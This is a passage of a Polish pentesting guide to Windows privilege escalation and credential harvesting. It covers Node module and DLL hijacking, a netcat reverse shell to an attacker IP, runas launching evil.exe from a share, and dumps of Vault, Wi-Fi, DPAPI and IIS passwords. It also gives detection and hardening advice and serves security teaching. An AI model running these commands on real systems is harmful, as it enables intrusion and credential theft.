Jeśli masz **uprawnienia do zapisu w folderze znajdującym się na PATH**, możesz być w stanie przejąć DLL załadowaną przez proces i **eskalować uprawnienia**.<sup>[[2]](#references)</sup>

Sprawdź uprawnienia do wszystkich folderów na PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Więcej informacji o tym, jak wykorzystać tę kontrolę:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking rozwiązywania modułów Node.js / Electron przez `C:\node_modules`

Jest to wariant **niekontrolowanej ścieżki wyszukiwania w Windows**, który dotyczy aplikacji **Node.js** i **Electron**, gdy wykonują import bez ścieżki, taki jak `require("foo")`, a oczekiwany moduł **nie istnieje**.<sup>[[20]](#references)</sup>

Node rozwiązuje pakiety, przechodząc w górę drzewa katalogów i sprawdzając foldery `node_modules` w każdym katalogu nadrzędnym. W Windows to przechodzenie może dotrzeć do katalogu głównego dysku, więc aplikacja uruchomiona z `C:\Users\Administrator\project\app.js` może sprawdzać kolejno:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Jeśli **użytkownik o niskich uprawnieniach** może utworzyć `C:\node_modules`, może umieścić w nim złośliwy plik `foo.js` (lub folder pakietu) i poczekać, aż **proces Node/Electron o wyższych uprawnieniach** spróbuje rozwiązać brakującą zależność. Payload zostanie uruchomiony w kontekście bezpieczeństwa procesu ofiary, co prowadzi do **LPE**, gdy cel działa jako administrator, w ramach podwyższonego zadania harmonogramu/usługi albo jako automatycznie uruchamiana aplikacja desktopowa z podwyższonymi uprawnieniami.

Jest to szczególnie częste, gdy:

- zależność jest zadeklarowana w `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka innej firmy opakowuje `require("foo")` w `try/catch` i kontynuuje działanie po błędzie
- pakiet usunięto z kompilacji produkcyjnych, pominięto podczas pakowania lub nie udało się go zainstalować
- podatne wywołanie `require()` znajduje się głęboko w drzewie zależności, a nie w głównym kodzie aplikacji

### Wyszukiwanie podatnych celów

Użyj **Procmon**, aby potwierdzić ścieżkę rozwiązywania modułów:<sup>[[23]](#references)</sup>

- Filtruj według `Process Name` = plik wykonywalny celu (`node.exe`, plik EXE aplikacji Electron lub proces wrappera)
- Filtruj według `Path` `contains` `node_modules`
- Skup się na `NAME NOT FOUND` i ostatnim udanym otwarciu w `C:\node_modules`

Przydatne wzorce do wyszukiwania podczas przeglądu kodu w rozpakowanych plikach `.asar` lub źródłach aplikacji:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Ustal **nazwę brakującego pakietu** na podstawie Procmon lub analizy kodu źródłowego.
2. Utwórz katalog wyszukiwania w katalogu głównym, jeśli jeszcze nie istnieje:

```powershell
mkdir C:\node_modules
```

3. Umieść moduł o dokładnie oczekiwanej nazwie:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Uruchom aplikację ofiary. Jeśli aplikacja spróbuje wykonać `require("foo")`, a brakuje właściwego modułu, Node może załadować `C:\node_modules\foo.js`.

Rzeczywiste przykłady brakujących modułów opcjonalnych pasujących do tego wzorca to `bluebird` i `utf-8-validate`, ale **technika** jest uniwersalna: znajdź dowolny **brakujący import bare**, który uprzywilejowany proces Node/Electron w systemie Windows będzie próbował rozwiązać.

### Pomysły na wykrywanie i hardening

- Generuj alerty, gdy użytkownik utworzy `C:\node_modules` lub zapisze w tym katalogu nowe pliki/pakiety `.js`.
- Wyszukuj procesy o wysokim poziomie integralności odczytujące pliki z `C:\node_modules\*`.
- W środowisku produkcyjnym dołączaj wszystkie zależności runtime i audytuj użycie `optionalDependencies`.
- Sprawdzaj kod firm trzecich pod kątem wzorców `try { require("...") } catch {}`, które po cichu ignorują błędy.
- Wyłączaj opcjonalne testy, jeśli biblioteka na to pozwala (na przykład niektóre wdrożenia `ws` mogą uniknąć sprawdzania starszego modułu `utf-8-validate`, ustawiając `WS_NO_UTF_8_VALIDATE=1`).

## Sieć

### Udziały

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### plik hosts

Sprawdź, czy w pliku hosts są na stałe wpisane adresy innych znanych komputerów.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Interfejsy sieciowe i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otwarte porty

Sprawdź z zewnątrz, czy są dostępne **usługi z ograniczonym dostępem**

```bash
netstat -ano #Opened ports?
```

W przypadku lokalnego procesu nasłuchującego powiąż jego PID z właścicielem procesu, ścieżką pliku wykonywalnego oraz usługą lub zadaniem zaplanowanym, które go uruchamia. Usługa zdalnego dostępu może zapewnić dostęp jako jej użytkownik pulpitu tylko wtedy, gdy pozwalają na to jej uwierzytelnianie i mechanizmy kontroli poleceń. Niestandardowa aplikacja TCP działająca na koncie o wyższych uprawnieniach jest osobnym celem analizy: nasłuchujący proces i ścieżka pliku binarnego to jedynie wskazówki, natomiast wykorzystanie błędu uszkodzenia pamięci po uwierzytelnieniu wymaga analizy konkretnego pliku binarnego i dostępnych dla niego danych wejściowych. Jeśli wygląda na to, że ujawniony port należy do procesu systemowego, sprawdź wynik polecenia [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), zanim przypiszesz mu usługę backendu; sama reguła przekierowania nie dowodzi, że miejsce docelowe jest osiągalne lub podatne na ataki.

### Routing Table

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Tabela ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Reguły zapory

[**Sprawdź tę stronę, aby poznać polecenia związane z zaporą**](../basic-cmd-for-pentesters.md#firewall) **(wyświetlanie reguł, tworzenie reguł, wyłączanie, wyłączanie...)**

Więcej[ poleceń do enumeracji sieci znajdziesz tutaj](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Plik binarny `bash.exe` można również znaleźć w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz uprawnienia użytkownika root, możesz nasłuchiwać na dowolnym porcie (przy pierwszym użyciu `nc.exe` do nasłuchiwania na porcie pojawi się graficzne pytanie, czy zezwolić programowi `nc` na działanie przez firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Aby łatwo uruchomić bash jako root, możesz spróbować `--default-user root`

Możesz przeglądać system plików `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Uprawnienia `root` w systemie Linux działającym w WSL same w sobie nie nadają uprawnień Administratora w systemie Windows. Jeśli bieżąca tożsamość systemu Windows może odczytać system plików dystrybucji, sprawdź pliki historii powłoki (w tym `/root/.bash_history`) pod kątem poleceń, które mogły zapisać dane uwierzytelniające. Eskalacja uprawnień nadal wymaga prawidłowego konta o wyższych uprawnieniach oraz dozwolonej ścieżki uwierzytelniania. Układ `LocalState\rootfs` dotyczy starszych instalacji WSL; w WSL 2 dystrybucja jest zwykle przechowywana na wirtualnym dysku [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), dlatego najpierw ustal faktyczną dystrybucję i ścieżkę przechowywania. Unikaj wypisywania zawartości historii podczas automatycznej enumeracji.

## Poświadczenia systemu Windows

### Poświadczenia Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Traktuj `DefaultUserName` i `DefaultDomainName` jako kontekst konta, a nie poświadczenia. Niepusta wartość `DefaultPassword` lub `AltDefaultPassword` oznacza znalezisko w rejestrze zawierające hasło w postaci jawnego tekstu. Jeśli `AutoAdminLogon=1`, ale nie można odczytać hasła w postaci jawnego tekstu, jest to tylko wskazówka: [Sysinternals Autologon może przechowywać hasło jako sekret LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a zwykły odczyt rejestru nie pozwala ustalić, czy ten sekret istnieje ani czy można go odzyskać. Przed zgłoszeniem ujawnienia poświadczeń sprawdź prawa dostępu i rzeczywistą konfigurację logowania.

### Menedżer poświadczeń / Windows Vault

Z [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault przechowuje poświadczenia użytkowników do serwerów, stron internetowych i innych programów, których **Windows** może używać do **automatycznego logowania użytkowników**. Na początku może się wydawać, że użytkownicy mogą przechowywać poświadczenia do witryn takich jak Facebook, Twitter czy Gmail, aby przeglądarki logowały się automatycznie, ale tak to nie działa.

Windows Vault przechowuje poświadczenia, których Windows może używać do automatycznego logowania użytkowników. Oznacza to, że każda **aplikacja Windows wymagająca poświadczeń, aby uzyskać dostęp do zasobu** (serwera lub strony internetowej) **może korzystać z tego Credential Managera** i Windows Vault oraz używać podanych poświadczeń zamiast za każdym razem wymagać od użytkowników wpisania nazwy użytkownika i hasła.

O ile aplikacje nie współpracują z Credential Managerem, nie sądzę, by mogły używać poświadczeń do danego zasobu. Jeśli więc aplikacja ma korzystać z vaulta, powinna w jakiś sposób **komunikować się z menedżerem poświadczeń i żądać poświadczeń do tego zasobu** z domyślnego magazynu vault.

Użyj `cmdkey`, aby wyświetlić poświadczenia przechowywane na maszynie.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Następnie możesz użyć `runas` z opcją `/savecred`, aby skorzystać z zapisanych poświadczeń. Poniższy przykład wywołuje zdalny plik binarny za pośrednictwem udziału SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Używanie `runas` z podanym zestawem poświadczeń.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Zwróć uwagę na mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) lub moduł [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Nowoczesne aplikacje Windows UWP, Microsoft Edge i nowoczesne usługi systemowe przechowują tokeny uwierzytelniające oraz hasła w postaci zwykłego tekstu w `PasswordVault` platformy Universal Windows Platform (UWP) (widocznym również jako `Web Credentials` w `vaultcmd`). Ta przestrzeń magazynowa jest odizolowana dla każdej sesji i można ją odszyfrować natywnie bez uprawnień administratora ani `SeDebugPrivilege`.

Wykonaj to polecenie PowerShell w aktywnej sesji użytkownika, aby natychmiast zrzucić i odszyfrować wszystkie przechowywane nazwy użytkowników oraz hasła w postaci zwykłego tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** udostępnia metodę symetrycznego szyfrowania danych, używaną głównie w systemie operacyjnym Windows do symetrycznego szyfrowania asymetrycznych kluczy prywatnych. Szyfrowanie to wykorzystuje sekret użytkownika lub systemu, który znacząco zwiększa entropię.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego wyprowadzanego z danych logowania użytkownika**. W przypadku szyfrowania systemowego wykorzystuje sekrety uwierzytelniające domeny systemu.

Zaszyfrowane klucze RSA użytkownika, przy użyciu DPAPI, są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie `{SID}` oznacza [identyfikator zabezpieczeń](https://en.wikipedia.org/wiki/Security_Identifier) użytkownika. **Klucz DPAPI, znajdujący się w tym samym pliku co klucz główny chroniący klucze prywatne użytkownika**, zazwyczaj składa się z 64 bajtów losowych danych. (Należy pamiętać, że dostęp do tego katalogu jest ograniczony, co uniemożliwia wyświetlenie jego zawartości za pomocą polecenia `dir` w CMD, choć można ją wyświetlić w PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Możesz użyć **modułu mimikatz** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby je odszyfrować.

**Pliki poświadczeń chronione hasłem głównym** zwykle znajdują się w:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Możesz użyć **modułu mimikatz** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować dane.\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli masz uprawnienia root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Poświadczenia PowerShell

**Poświadczenia PowerShell** są często używane w **skryptach** i zadaniach automatyzacji jako wygodny sposób przechowywania zaszyfrowanych poświadczeń. Są one chronione za pomocą **DPAPI**, co zazwyczaj oznacza, że można je odszyfrować tylko na tym samym komputerze i przez tego samego użytkownika, który je utworzył.

Wyeksportowane poświadczenie może mieć dowolną nazwę pliku lub ścieżkę `.xml`. Gdy skrypt lub inwentaryzacja plików wskazuje taki plik, ustal rzeczywistą lokalizację profilu konta, zamiast zakładać, że znajduje się on w `C:\Users`: [Windows może umieszczać profile w innych lokalizacjach](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Odczytywalny plik jest tylko wskazówką; [`Export-Clixml` w Windows wiąże zaszyfrowane poświadczenie z użytkownikiem i komputerem, które je wyeksportowały](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a odzyskane konto musi osobno mieć odpowiednie uprawnienia do docelowej usługi. Najpierw sprawdź ścieżki i ACL, nie wyświetlając zaszyfrowanych ani jawnych wartości podczas rutynowej enumeracji.

Aby **odszyfrować** poświadczenie PS z pliku, który je zawiera, możesz wykonać:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Zapisane połączenia RDP

Można je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
oraz w `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Ostatnio uruchamiane polecenia

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Menedżer poświadczeń pulpitu zdalnego**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Użyj modułu `dpapi::rdg` narzędzia **Mimikatz** z odpowiednim `/masterkey`, aby **odszyfrować pliki .rdg**\
Za pomocą modułu `sekurlsa::dpapi` narzędzia Mimikatz możesz **wyodrębnić z pamięci wiele kluczy głównych DPAPI**

**mRemoteNG używa innego magazynu połączeń.** Sprawdź czytelne pliki XML w `%APPDATA%\mRemoteNG` i folderze Dokumenty użytkownika, w tym pliki o zwyczajnych nazwach, takich jak `config.xml`. Zidentyfikuj schemat połączeń i zaszyfrowane atrybuty `Password`, zanim uznasz plik XML za źródło danych uwierzytelniających. Zapisana wartość nie jest hasłem DPAPI/RDCMan; jej odzyskanie zależy od ustawień szyfrowania pliku i od tego, czy użyto niestandardowego hasła głównego. Podczas szerokiego przeszukiwania nie wyświetlaj zaszyfrowanych wartości.

**Eksporty profili Remote Desktop Plus** mogą być też czytelne w katalogach użytkowników lub współdzielonym folderze administracyjnym. Starszy eksport `profiles.xml` zawiera wpisy `Data/Profile` z elementami `ProfileName`, `Password` i `Secure`. Niepusty element hasła traktuj jako potencjalne źródło danych uwierzytelniających, nie wyświetlając go ani nie zakładając, że jest tekstem jawnym: [producent informuje](https://www.donkz.nl/), że ochrona profilu może być powiązana z kontem i komputerem, na których go utworzono, albo skonfigurowana mniej rygorystycznie. Zanim wykorzystasz ten plik, potwierdź jego pochodzenie i warunki odzyskania danych.

### Sticky Notes

Ludzie czasem zapisują hasła i inne informacje w aplikacjach z karteczkami. Pakietowa aplikacja Sticky Notes firmy Microsoft zwykle przechowuje notatki w `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starsze lub inne aplikacje mogą używać innych magazynów w profilu użytkownika, w tym LevelDB. Ustal, jaka aplikacja jest zainstalowana i jakiego formatu używa, zanim uznasz brak pliku SQLite za brak notatek.

Jeśli Sticky Notes używa dziennika zapisu z wyprzedzeniem SQLite (WAL), sama kopia `plum.sqlite` może nie zawierać ostatnio zatwierdzonych notatek. Zachowaj pasujący plik `plum.sqlite-wal` wraz ze spójną kopią bazy danych, a jeśli jest dostępny, dołącz też plik `plum.sqlite-shm`; indeks pamięci współdzielonej można odbudować, ale WAL jest częścią trwałego stanu bazy danych. Zobacz [dokumentację WAL SQLite](https://www.sqlite.org/wal.html). Notatkę zawierającą nazwę konta lub hasło traktuj wyłącznie jako potencjalne źródło danych uwierzytelniających: osobno zweryfikuj konto, dozwolony dostęp i ponowne użycie hasła. Zaszyfrowany rekord menedżera haseł wymaga ponadto właściwego klucza deszyfrującego i interpretacji właściwej dla aplikacji, zanim będzie można uznać go za dowód możliwości logowania na konto o wyższych uprawnieniach.

### AppCmd.exe

**Pamiętaj, że do odzyskania haseł z AppCmd.exe musisz mieć uprawnienia Administratora i uruchomić program na poziomie wysokiej integralności.**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\
Jeśli ten plik istnieje, możliwe, że skonfigurowano jakieś **dane uwierzytelniające**, które można **odzyskać**.

Ten kod został zaczerpnięty z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Sprawdź, czy istnieje `C:\Windows\CCM\SCClient.exe`.\
Instalatory są **uruchamiane z uprawnieniami SYSTEM**, wiele z nich jest podatnych na **DLL Sideloading (informacje z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Pliki i rejestr (poświadczenia)

### Artefakty poświadczeń w rejestrze narzędzi pomocy technicznej

Niektóre starsze instalacje oprogramowania do zdalnej pomocy technicznej zachowują nazwy wartości związanych z hasłami pod stałymi kluczami rejestru aplikacji. Na przykład `SecurityPasswordAES` w TeamViewer identyfikował skonfigurowane statyczne hasło sesji w wersjach wcześniejszych niż 9, zgodnie z [wyjaśnieniem dostawcy dotyczącym klucza rejestru](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Znacznik w postaci nazwy wartości jest jedynie wskazówką do sprawdzenia: przed oceną danego poświadczenia zweryfikuj zainstalowaną wersję, możliwość odczytu danych wartości, ich format oraz bieżące zachowanie mechanizmu uwierzytelniania. Przejście od hasła do zdalnej pomocy technicznej do bardziej uprzywilejowanego konta Windows wymaga również faktycznego ponownego użycia hasła i uprawnień do tego konta. Nie umieszczaj tekstu zaszyfrowanego ani odzyskanych haseł w standardowych wynikach enumeracji.

### Udostępnione arkusze kalkulacyjne z chronionymi arkuszami

Jeśli podejrzewasz, że czytelny, udostępniony skoroszyt zawiera dane kont, rozróżnij **szyfrowanie pliku** od ochrony arkusza lub ukrytych kolumn. [Microsoft informuje](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), że ochrona arkusza kontroluje edycję i nie jest funkcją zabezpieczeń; sama w sobie nie oznacza, że zawartość skoroszytu jest zaszyfrowana. Sprawdzaj wyłącznie pliki, do których masz upoważniony dostęp i które są istotne, a podczas szerokiej enumeracji nie wyświetlaj potencjalnych sekretów. Sama ścieżka do czytelnego pliku `.xlsx`, chroniony arkusz lub ukryta kolumna nie dowodzą, że istnieją poświadczenia ani że którekolwiek konto ma wyższe uprawnienia; zweryfikuj osobno faktyczne dane i bieżące uprawnienia konta.

### Zachowane poprawki zmian na serwerze CI

Serwer CI może zachować przesłane zmiany w kodzie źródłowym w swoim katalogu danych, nawet po zakończeniu kompilacji. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html), że `system/changes` służy do przechowywania zmian zdalnego uruchomienia; katalog danych można skonfigurować i nie musi znajdować się w `ProgramData`. Czytelna poprawka może zachować usunięte lub dodane odwołania do pliku poświadczeń, klucza szyfrowania albo skryptu korzystającego z obu tych elementów. Na przykład przepływ pracy PowerShell z `ConvertTo-SecureString -Key` wymaga zarówno klucza AES, jak i zaszyfrowanego ciągu; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), że klucz jest dostarczany osobno. Najpierw sprawdzaj wyłącznie nazwy poprawek, do których masz dostęp, a następnie — za odpowiednim upoważnieniem — analizuj istotną zawartość, nie wyświetlając sekretów w standardowych wynikach enumeracji. Sama ścieżka poprawki, zaszyfrowana wartość lub odwołanie do klucza nie dowodzą istnienia prawidłowego poświadczenia ani dostępu o wyższych uprawnieniach. Ogranicz uprawnienia ACL katalogu danych i nie umieszczaj sekretów w zmianach wprowadzanych podczas kompilacji.

### Własny mechanizm rotacji haseł lokalnego administratora

Napisany na własne potrzeby mechanizm rotacji haseł może przechowywać zaszyfrowane hasło lokalnego administratora w lokalnej usłudze, a jednocześnie trzymać poświadczenia do bazy danych w czytelnym pliku `.env` lub obok pliku binarnego aktualizatora. Sprawdź łącznie zadanie zaplanowane aktualizatora, konto, uprawnienia ACL konfiguracji, interfejs nasłuchiwania i uprawnienia do bazy danych. Baza danych dostępna wyłącznie przez loopback jest nadal osiągalna dla lokalnego użytkownika mającego prawidłowe poświadczenia, ale samo uwierzytelnienie nie dowodzi, że ma on uprawnienia do odczytu odpowiednich rekordów. Jeśli ziarno szyfrowania lub materiał klucza są dostępne obok tekstu zaszyfrowanego, przed uznaniem szyfrowania za wiarygodne sprawdź dokładny sposób wyprowadzania klucza. Schemat, który deterministycznie wyprowadza klucz AES z ujawnionego ziarna przy użyciu Go [`math/rand`](https://pkg.go.dev/math/rand), nie nadaje się do ochrony tego hasła; dokumentacja Go wskazuje, że ten pakiet nie jest odpowiedni do generowania liczb losowych w zastosowaniach wymagających bezpieczeństwa. Zanim uznasz odzyskane hasło za ścieżkę eskalacji, potwierdź, że jest aktualne i należy do konta należącego do lokalnej grupy Administrators. Samo zadanie zaplanowane, ścieżka `.env` lub zaszyfrowany ciąg nie dowodzą żadnego z tych warunków. Nie umieszczaj haseł ani materiału klucza w standardowych wynikach enumeracji.

Do zarządzania hasłami lokalnych administratorów używaj [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Jego magazyn w katalogu lub Entra oraz mechanizmy kontroli dostępu różnią się od własnej lokalnej bazy danych; podobnie [role Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) decydują o tym, czy uwierzytelniony użytkownik bazy danych może odczytać konkretny indeks.

### Archiwa wtyczek serwera Java i ponowne użycie poświadczeń

Niektóre wtyczki serwerów Java są dystrybuowane jako archiwa JAR w katalogu `plugins` serwera. Czytelna, niestandardowa wtyczka może zawierać konfigurację lub kod bajtowy z osadzonym poświadczeniem usługi. Analizuj archiwum wyłącznie za odpowiednim upoważnieniem i nie umieszczaj odzyskanych sekretów w standardowych wynikach enumeracji. Sama ścieżka do wtyczki nie dowodzi, że sekret istnieje, a odzyskane hasło usługi prowadzi do wyższych uprawnień tylko wtedy, gdy jest również prawidłowe dla konta z wyższymi uprawnieniami. Sprawdź odpowiednie uprawnienia ACL plików i zastąp ponownie używane poświadczenia odrębnymi sekretami. Informacje o układzie katalogów znajdziesz w [przewodniku PaperMC dotyczącym instalacji wtyczek](https://docs.papermc.io/paper/adding-plugins/), a o zawartości archiwów — w [dokumentacji JAR firmy Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Poświadczenia wbudowanej bazy danych Openfire

